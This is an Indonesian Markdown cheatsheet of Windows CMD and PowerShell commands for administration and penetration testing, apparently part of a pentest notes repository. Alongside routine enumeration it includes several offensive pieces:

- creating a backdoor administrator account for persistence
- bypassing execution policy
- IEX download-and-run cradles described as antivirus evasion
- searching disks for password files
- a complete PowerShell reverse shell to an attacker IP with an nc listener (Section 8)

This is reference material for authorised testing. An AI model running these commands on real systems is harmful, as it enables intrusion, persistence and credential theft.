# 🪟 Ultimate Windows CMD & PowerShell Cheatsheet

Panduan praktis dan ringkasan lengkap penggunaan **Command Prompt (CMD)** dan **PowerShell** untuk navigasi sistem, enumerasi, administrasi, dan *penetration testing* pada lingkungan Windows.

---

## 📋 Daftar Isi
1. [Sintaks Dasar & Navigasi (CMD)](#1-sintaks-dasar--navigasi-cmd)
2. [Manajemen File & Direktori (CMD)](#2-manajemen-file--direktori-cmd)
3. [Manajemen User & Group (CMD)](#3-manajemen-user--group-cmd)
4. [Informasi Jaringan (CMD)](#4-informasi-jaringan-cmd)
5. [PowerShell Dasar & Execution Policy](#5-powershell-dasar--execution-policy)
6. [Enumerasi Sistem (PowerShell)](#6-enumerasi-sistem-powershell)
7. [Download & Transfer File (PowerShell)](#7-download--transfer-file-powershell)
8. [PowerShell Remoting & Reverse Shell](#8-powershell-remoting--reverse-shell)
9. [Tabel Referensi Command Populer](#9-tabel-referensi-command-populer)

---

## 1. Sintaks Dasar & Navigasi (CMD)

### 🔹 Navigasi Direktori
```cmd
cd C:\Users\Public
dir
tree /F
```
* **`dir`**: Menampilkan isi direktori (setara `ls` di Linux).
* **`tree /F`**: Menampilkan struktur direktori dalam bentuk pohon beserta seluruh berkas di dalamnya.

### 🔹 Melihat Informasi Sistem
```cmd
systeminfo
hostname
whoami
```
* **`systeminfo`**: Menampilkan detail lengkap sistem (versi OS, hotfix terpasang, arsitektur, dll) — berguna untuk mencocokkan dengan exploit privilege escalation yang diketahui.
* **`whoami /priv`**: Menampilkan hak akses (*privilege*) yang dimiliki user saat ini.

---

## 2. Manajemen File & Direktori (CMD)

### 🔹 Menyalin, Memindahkan, & Menghapus
```cmd
copy file.txt D:\backup\
move file.txt D:\backup\
del file.txt
```

### 🔹 Mencari Berkas (`dir /s`)
```cmd
dir /s /b C:\*password*
```
* **`/s`**: Mencari secara rekursif ke seluruh subdirektori.
* **`/b`**: Menampilkan output dalam format ringkas (hanya path, tanpa header/detail lain).

### 🔹 Menampilkan Isi Berkas Teks
```cmd
type file.txt
```
* **Penjelasan:** Setara `cat` di Linux, menampilkan isi berkas teks langsung di terminal.

### 🔹 Melihat & Mengubah Atribut Berkas (`attrib`)
```cmd
attrib +h +s file.txt
```
* **`+h`**: Menyembunyikan berkas (*hidden*).
* **`+s`**: Menandai sebagai *system file*.

---

## 3. Manajemen User & Group (CMD)

### 🔹 Melihat Daftar User & Group Lokal
```cmd
net user
net localgroup
net localgroup Administrators
```
* **`net user`**: Menampilkan seluruh akun user lokal.
* **`net localgroup Administrators`**: Menampilkan anggota grup Administrator lokal.

### 🔹 Membuat User Baru & Menambahkan ke Grup Admin
```cmd
net user hacker Password123! /add
net localgroup Administrators hacker /add
```
* **Penjelasan:** Membutuhkan hak akses admin. Sering dipakai sebagai langkah *persistence* setelah berhasil eskalasi privilege (pada engagement yang sudah diizinkan).

### 🔹 Informasi Detail Domain (`net user /domain`)
```cmd
net user /domain
net group "Domain Admins" /domain
```
* **Penjelasan:** Menampilkan informasi user/grup pada level *domain* (Active Directory), bukan hanya lokal — membutuhkan mesin tergabung dalam domain.

---

## 4. Informasi Jaringan (CMD)

### 🔹 Konfigurasi & Koneksi Jaringan
```cmd
ipconfig /all
netstat -ano
```
* **`ipconfig /all`**: Menampilkan detail konfigurasi seluruh adapter jaringan.
* **`netstat -ano`**: Menampilkan koneksi aktif beserta PID proses yang menggunakannya.

### 🔹 Tabel ARP & Routing
```cmd
arp -a
route print
```

### 🔹 Berbagi Berkas di Jaringan (`net share` / `net view`)
```cmd
net view \\192.168.1.10
net use Z: \\192.168.1.10\share /user:admin Password123!
```
* **`net view`**: Menampilkan daftar *shared folder* pada host tertentu.
* **`net use`**: Memetakan *network share* ke drive letter lokal.

---

## 5. PowerShell Dasar & Execution Policy

### 🔹 Menjalankan Script PowerShell
```powershell
powershell -ExecutionPolicy Bypass -File script.ps1
```
* **`-ExecutionPolicy Bypass`**: Mengabaikan pembatasan default yang biasanya memblokir eksekusi script `.ps1` yang tidak ditandatangani.

### 🔹 Menjalankan Perintah Inline (`-Command`)
```powershell
powershell -nop -c "Get-Process"
```
* **`-nop`**: *No profile*, tidak memuat profil PowerShell (mempercepat startup).
* **`-c`**: Menjalankan satu baris perintah langsung tanpa masuk ke sesi interaktif.

### 🔹 Menjalankan Script yang Di-encode Base64 (`-EncodedCommand`)
```powershell
powershell -EncodedCommand <base64_string>
```
* **`-EncodedCommand`**: Menjalankan perintah yang sudah di-encode Base64 — sering dipakai untuk menghindari masalah *escaping* karakter khusus, tapi juga sering dipantau sebagai indikator mencurigakan oleh EDR/antivirus.

---

## 6. Enumerasi Sistem (PowerShell)

### 🔹 Informasi Sistem & Proses
```powershell
Get-ComputerInfo
Get-Process
Get-Service
```

### 🔹 Enumerasi User & Grup Lokal
```powershell
Get-LocalUser
Get-LocalGroupMember -Group "Administrators"
```

### 🔹 Melihat Hak Akses & Token Privilege
```powershell
whoami /priv
whoami /groups
```

### 🔹 Mencari Berkas Berisi Kata Kunci (`Select-String`)
```powershell
Get-ChildItem -Path C:\ -Include *.txt,*.config -Recurse -ErrorAction SilentlyContinue |
  Select-String -Pattern "password"
```
* **`Select-String`**: Setara `grep` di PowerShell, mencari pola teks di dalam berkas.
* **`-Recurse`**: Mencari secara rekursif ke seluruh subdirektori.

### 🔹 Enumerasi Otomatis (WinPEAS / PowerUp)
```powershell
IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.5/PowerUp.ps1'); Invoke-AllChecks
```
* **`IEX` (`Invoke-Expression`)**: Menjalankan script PowerShell yang diunduh langsung dari memori tanpa menyimpannya ke disk.
* **`PowerUp.ps1`**: Script populer untuk enumerasi otomatis vektor privilege escalation di Windows (service misconfiguration, unquoted path, DLL hijacking, dll).

---

## 7. Download & Transfer File (PowerShell)

### 🔹 Mengunduh Berkas (`Invoke-WebRequest`)
```powershell
Invoke-WebRequest -Uri "http://192.168.1.5/file.exe" -OutFile "C:\Users\Public\file.exe"
```
* **`-Uri`**: URL sumber berkas.
* **`-OutFile`**: Lokasi penyimpanan berkas hasil unduhan.

### 🔹 Mengunduh & Menjalankan Langsung dari Memori
```powershell
IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.5/script.ps1')
```
* **Penjelasan:** Mengeksekusi script langsung tanpa menyentuh disk — teknik umum untuk menghindari deteksi antivirus berbasis signature file.

### 🔹 Transfer via SMB (`net use` + `copy`)
```powershell
net use \\192.168.1.5\share /user:admin Password123!
copy \\192.168.1.5\share\file.exe C:\Users\Public\
```

---

## 8. PowerShell Remoting & Reverse Shell

> 🚨 Bagian ini hanya untuk digunakan pada sistem sendiri atau target yang sudah memiliki izin pengujian resmi.

### 🔹 PowerShell Remoting (WinRM)
```powershell
Enter-PSSession -ComputerName 192.168.1.10 -Credential (Get-Credential)
```
* **`Enter-PSSession`**: Membuka sesi PowerShell interaktif ke komputer lain melalui protokol WinRM (mirip SSH untuk Windows).

### 🔹 Menjalankan Perintah Jarak Jauh (`Invoke-Command`)
```powershell
Invoke-Command -ComputerName 192.168.1.10 -ScriptBlock { whoami } -Credential (Get-Credential)
```
* **`Invoke-Command`**: Menjalankan satu blok perintah pada komputer remote tanpa membuka sesi interaktif penuh.

### 🔹 Reverse Shell PowerShell Sederhana

**Di mesin penyerang (listener):**
```bash
nc -lvnp 4444
```

**Di mesin target:**
```powershell
$client = New-Object System.Net.Sockets.TCPClient("192.168.1.5",4444);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
  $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
  $sendback = (iex $data 2>&1 | Out-String );
  $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
  $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
  $stream.Write($sendbyte,0,$sendbyte.Length);
  $stream.Flush()
};
$client.Close()
```
* **Penjelasan:** Membuka koneksi TCP ke listener penyerang, lalu meneruskan setiap perintah yang diketik di sisi listener untuk dieksekusi (`iex`) di mesin target, dan mengirim hasilnya kembali. Cara ini sering terdeteksi AV modern karena polanya sudah sangat dikenal — pada engagement nyata biasanya dikombinasikan dengan payload dari Metasploit (`msfvenom`, lihat [`Metasploit/README.md`](../Metasploit)).

---

## 9. Tabel Referensi Command Populer

| Command | Environment | Fungsi / Deskripsi |
| :--- | :--- | :--- |
| `dir /s /b` | CMD | Mencari berkas secara rekursif |
| `systeminfo` | CMD | Menampilkan detail lengkap sistem operasi |
| `net user` | CMD | Melihat/mengelola akun user lokal |
| `net localgroup Administrators` | CMD | Melihat anggota grup Administrator |
| `netstat -ano` | CMD | Melihat koneksi jaringan aktif beserta PID |
| `ipconfig /all` | CMD | Melihat konfigurasi jaringan lengkap |
| `-ExecutionPolicy Bypass` | PowerShell | Mengabaikan pembatasan eksekusi script |
| `-EncodedCommand` | PowerShell | Menjalankan perintah yang di-encode Base64 |
| `Get-LocalUser` | PowerShell | Menampilkan daftar user lokal |
| `whoami /priv` | CMD/PowerShell | Melihat hak akses/privilege token user aktif |
| `Select-String` | PowerShell | Mencari pola teks di dalam berkas (setara `grep`) |
| `Invoke-WebRequest` | PowerShell | Mengunduh berkas dari server |
| `IEX (New-Object Net.WebClient).DownloadString` | PowerShell | Mengunduh & menjalankan script langsung dari memori |
| `Enter-PSSession` | PowerShell | Membuka sesi remote interaktif (WinRM) |
| `Invoke-Command` | PowerShell | Menjalankan perintah pada komputer remote |

---